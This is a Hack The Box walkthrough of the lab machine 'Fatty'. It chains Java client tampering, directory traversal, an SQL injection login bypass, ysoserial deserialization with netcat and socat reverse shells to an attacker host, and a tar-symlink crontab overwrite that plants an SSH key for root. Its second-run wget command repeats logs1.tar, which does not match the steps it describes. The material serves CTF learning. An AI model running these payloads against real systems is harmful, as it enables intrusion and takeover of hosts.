---
layout: post
title: "Fatty: Hack The Box Walkthrough"
date: 2020-08-08 17:52:38 +0000
last_modified_at: 2020-08-08 17:52:38 +0000
category: Walkthrough
tags: ["Hack The Box", Fatty, retired, Linux, Insane]
comments: true
image:
  feature: fatty-htb-walkthrough.png
---

This post documents the complete walkthrough of Fatty, a retired vulnerable [VM][1] created by [qtc][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Fatty is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.174 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-02-11 07:10:03 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.10.174
Discovered open port 22/tcp on 10.10.10.174
Discovered open port 1339/tcp on 10.10.10.174
Discovered open port 1338/tcp on 10.10.10.174
Discovered open port 1337/tcp on 10.10.10.174
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,22,1337,1338,1339 -A --reason 10.10.10.174 -oN nmap.txt
...
PORT     STATE SERVICE            REASON         VERSION
21/tcp   open  ftp                syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp      15426727 Oct 30 12:10 fatty-client.jar
| -rw-r--r--    1 ftp      ftp           526 Oct 30 12:10 note.txt
| -rw-r--r--    1 ftp      ftp           426 Oct 30 12:10 note2.txt
|_-rw-r--r--    1 ftp      ftp           194 Oct 30 12:10 note3.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.15.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)
|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)
1337/tcp open  ssl/waste?         syn-ack ttl 62
|_ssl-date: 2020-02-11T07:18:18+00:00; +1s from scanner time.
1338/tcp open  ssl/wmc-log-svc?   syn-ack ttl 62
|_ssl-date: 2020-02-11T07:18:18+00:00; +1s from scanner time.
1339/tcp open  ssl/kjtsiteserver? syn-ack ttl 62
|_ssl-date: 2020-02-11T07:18:18+00:00; +1s from scanner time.
```

Since anonymous FTP is available. Let's check out the files.

### Anonymous FTP

The first note.

<div class="filename"><span>note.txt</span></div>

```
Dear members,

because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337.
Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice
if you use different servers from day to day to balance the server load.

We were too lazy to fix the default port in the '.jar' file, but since you are all senior java developers you should be capable of
doing it yourself ;)

Best regards,
qtc
```

The second note.

<div class="filename"><span>note2.txt</span></div>

```
Dear members,

we are currently experimenting with new java layouts. The new client uses a static layout. If your
are using a tiling window manager or only have a limited screen size, try to resize the client window
until you see the login from.

Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
per default, you may need to install it manually.

Best regards,
qtc
```

The third note.

<div class="filename"><span>note3.txt</span></div>

```
Dear members,

We had to remove all other user accounts because of some seucrity issues.
Until we have fixed these issues, you can use my account:

User: qtc
Pass: clarabibi

Best regards,
qtc
```

The notes sound about right. We see open ports `1337/tcp`, `1338/tcp` and `1339/tcp`, corresponding to the "fatty java server".

### Manipulating JAR file

First up, right after I extracted the JAR file with `jar` I notice the file `beans.xml` contains the connection information. Maybe I should change that to `1337`, `1338` or `1339`? Prior to this, I've already installed Java 8 on my Kali Linux. Following up on that, we need to `update-alternatives --config (java|javac)` as well.

{% include image.html image_alt="44021193.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/44021193.png" %}

We got all the tools needed in the JDK to re-create a JAR file and to sign it.

### Self-Signed JAR file

To do that, we need to create our own PKCS\#12 keystore because the keystore included in the JAR file doesn't cut it. And it's worthy to note that we can't touch it.

{% include image.html image_alt="1f165571.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/1f165571.png" %}

Change `8000` in `beans.xml` to say, `1337`.

{% include image.html image_alt="46795591.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/46795591.png" %}

Remove all the file digests in `META-INF/MANIFEST.MF`.

```
# sed -i -r 's/^SHA.*$//g' META-INF/MANIFEST.MF
```

Then create the JAR file with manifest information like so.

```
# jar cvmf META-INF/MANIFEST.MF fatty-client.jar *
```

Next, we sign the JAR file with the keystore created previously.

{% include image.html image_alt="8b53c34a.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/8b53c34a.png" %}

If all goes well, we should be able to connect to the fatty server.

{% include image.html image_alt="abab1c23.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/abab1c23.png" %}

### Decompiling the Fat Client

It was after decompiling `fatty-client.jar` with `jd-gui` that I found the keystore password to the actual `fatty.p12`

{% include image.html image_alt="439a2047.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/439a2047.png" %}

### Exploiting the Fat Client

Long story short. I noticed a directory traversal vulnerability with the file open feature of the fat client.

{% include image.html image_alt="b8ecfba2.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/b8ecfba2.png" %}

Opening a non-existent file exposes the current folder. Attempt to prepend `../` to the file name is filtered by the backend server.

{% include image.html image_alt="70db5c94.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/70db5c94.png" %}

Good thing I have the entire JAR file decompiled by `jd-gui`. I can edit any of the three `JMenuItem` objects, namely, "Configs", "Notes", and "Mail", to `\u002e\u002e/`, which is the escaped Unicode characters for "`../`". I know I'm going to modify the Java source code quite a bit, so I wrote a simple shell script to help build the JAR file.

<div class="filename"><span>build.sh</span></div>

```
#!/bin/bash

rm fatty-client.jar
jar cvmf META-INF/MANIFEST.MF fatty-client.jar *
jarsigner -keystore fatty.p12 -storepass secureclarabibi123 fatty-client.jar 1
```

Edit this part of `htb/fatty/client/gui/ClientGuiTest.java` as follows:

~~~~java
/* 368 */     configs.addActionListener(new ActionListener()
/*     */         {
/*     */           public void actionPerformed(ActionEvent e) {
/* 371 */             String response = "";
/* 372 */             //ClientGuiTest.this.currentFolder = "configs";
/* 372 */             ClientGuiTest.this.currentFolder = "\u002e\u002e/";
/*     */             try {
/* 374 */               //response = ClientGuiTest.this.invoker.showFiles("configs");
/* 374 */               response = ClientGuiTest.this.invoker.showFiles("\u002e\u002e/");
/* 375 */             } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
/* 376 */               JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
/*     */
/*     */
/*     */             }
/* 380 */             catch (IOException e2) {
/* 381 */               JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
/*     */             }
/*     */
/*     */
/*     */
/* 386 */             textPane.setText(response);
/*     */           }
/*     */         });
~~~~

Listing the "Configs" folder becomes like this.

{% include image.html image_alt="5e0ed2d5.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/5e0ed2d5.png" %}

And look at where we are at the filesystem.

{% include image.html image_alt="1d3bb3e6.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/1d3bb3e6.png" %}

### Downloading `fatty-server.jar`

I know displaying the `byte[]` content of `fatty-server.jar` on the `JTextPane` would be a challenge. So, I modified `ResponseMessage` to write the `base64`-encoded content to `FattyLogger` instead. :triumph:

{% include image.html image_alt="19796c2b.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/19796c2b.png" %}

Here's the file structure of the JAR file.

{% include image.html image_alt="c91ae460.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/c91ae460.png" %}

#### SQL Injection Vulnerability in `FattyDbSession.class`

It wasn't long before I discover a SQL injection vulnerability in `FattyDbSession.checkLogin()`.

{% include image.html image_alt="440faa7d.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/440faa7d.png" %}

In order to exploit the SQL injection vulnerability, we need to made some changes to the fat client because there's a password comparison between the "old" user and the "new" user highlighted in red above.

I made changes to `LoginMessage.class` to always send the hashed password of `clarabibi`.

{% include image.html image_alt="af0427c2.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/af0427c2.png" %}

Once that's done, I can login with the `admin` role with the following SQL injection string.

```
' UNION ALL SELECT id, username, email, password, 'admin' FROM users -- -
```

{% include image.html image_alt="d95f8c78.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/d95f8c78.png" %}

You can see that all the menu items are unlocked.

{% include image.html image_alt="e68dab7c.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/e68dab7c.png" %}

## Low-Privileged Shell

Now what?

...

Scanning the class files of `fatty-server.jar`, you'll spot a classic Java deserialization vulnerability in `Commands.changePW()`.

{% include image.html image_alt="bd8c59b0.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/bd8c59b0.png" %}

But soon you'll discover that the corresponding `changePW` functionality is not implemented in the fat client. :angry:

{% include image.html image_alt="bc42db15.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/bc42db15.png" %}

Fret not, we can implement it ourselves in `ClientGuiTest.class` like so.

{% include image.html image_alt="c52bbb82.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/c52bbb82.png" %}

Comment out the old line and add the code highlighted in red above. In addition to that, we also need to modify `Invoker.changePW()` like so.

{% include image.html image_alt="288ae591.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/288ae591.png" %}

### Y so serial?

To help myself in testing out different `ysoserial` payloads, I wrote the following shell script.

<div class="filename"><span>exploit.sh</span></div>

```
#!/bin/bash


INJECT=htb/fatty/client/gui/ClientGuiTest.java
BACKUP=${INJECT}.in
PAYLOAD="$(ysoserial "$@" 2>&1 | sed '1d' | base64 -w0)"

sed -r -e "s|base64-encoded payload here|${PAYLOAD}|" $BACKUP > $INJECT

javac $INJECT

./build.sh
```

It's evident that the Apache Commons is used in `fatty-server.jar`. Long story short, the `ysoserial` payload is `CommonsCollection5` and the command I use is:

```
# ./exploit.sh CommonsCollections 'busybox nc 10.10.x.x 1234 -e /bin/sh'
```

You might ask, how did I know I need use `busybox`? Earlier on, I ran the `uname` command in the fat client and saw that it's a Docker container. Also, navigating around the menu items in the fat client revealed that it's a alpine image.

{% include image.html image_alt="c414cb52.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/c414cb52.png" %}

Lo and behold, a shell!

{% include image.html image_alt="b033a8ca.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/b033a8ca.png" %}

Let's transfer a statically-compiled `socat` and use [it](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) to run an upgraded reverse shell back.

```
./socat tcp-connect:10.10.x.x:4321 exec:sh,pty,stderr,setsid,sigint,sane &
```

{% include image.html image_alt="70113dea.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/ab8c8803.png" %}

Bam. There you have it.

### Getting `user.txt`

No surprise there. The file `user.txt` is at `qtc`'s home directory. However, it's void of any permissions.

{% include image.html image_alt="e74be6c0.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/e74be6c0.png" %}

This is easy to fix. I can generate a pair of SSH keys and use SSH to add read rights to it like so.

{% include image.html image_alt="e9b7ee4a.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/e9b7ee4a.png" %}

## Privilege Escalation

During enumeration of `qtc`'s account, I notice that for every minute someone or something is executing `scp` like so.

{% include image.html image_alt="8bf0e436.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/8bf0e436.png" %}

Looks like we need shuttle some kind of malicious payload into `/opt/fatty/tar/logs.tar`. :wink: Immediately I thought of [this](https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0101-exploits/tar-symlink.txt): GNU tar symlink vulnerability. Too bad it didn't work. Kudos to [IhsanSencan](https://www.hackthebox.eu/home/users/profile/100992) for the nudge to send in two `logs.tar` instead like this:

1. Create a symlink (`logs.tar`) to `/etc/crontab`


```
# ln -s /etc/crontab logs.tar
```


2. Create `logs1.tar` (1st run) with the symlink


```
# tar cvf logs1.tar logs.tar
# tar tvf logs1.tar
lrwxrwxrwx root/root         0 2020-02-17 16:24 logs.tar -> /etc/crontab
```

3. Copy a crontab to `logs2.tar` (2nd run)


```
# echo "* * * * * root echo ssh-rsa AAA... >> /root/.ssh/authorized_keys" > logs2.tar
```

Notice we are `echo`ing a SSH public key we control to `root`'s `authorized_keys`? I figure this is the fastest way to gain a `root` shell.

Now, over at `qtc`'s shell, wait for `ash -c scp -f /opt/fatty/logs.tar` to appear then run the following command. This is the first run.

```
$ wget -O/opt/fatty/tar/logs.tar 10.10.x.x/logs1.tar
```

Once `ash -c scp -f /opt/fatty/tar/logs.tar` appears a second time in the next minute, run the following command. This is the second run.

```
$ wget -O/opt/fatty/tar/logs.tar 10.10.x.x/logs1.tar
```

Wait for another minute and we should be able to log in as `root` via SSH.

{% include image.html image_alt="954e3797.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/954e3797.png" %}

Sweet!

### Getting `root.txt`

Getting `root.txt` is trivial with a `root` shell.

{% include image.html image_alt="a78a82da.png" image_src="/3185267d-27f0-4823-bf4b-220b38ec9848/a78a82da.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/227
[2]: https://www.hackthebox.eu/home/users/profile/103578
[3]: https://www.hackthebox.eu/
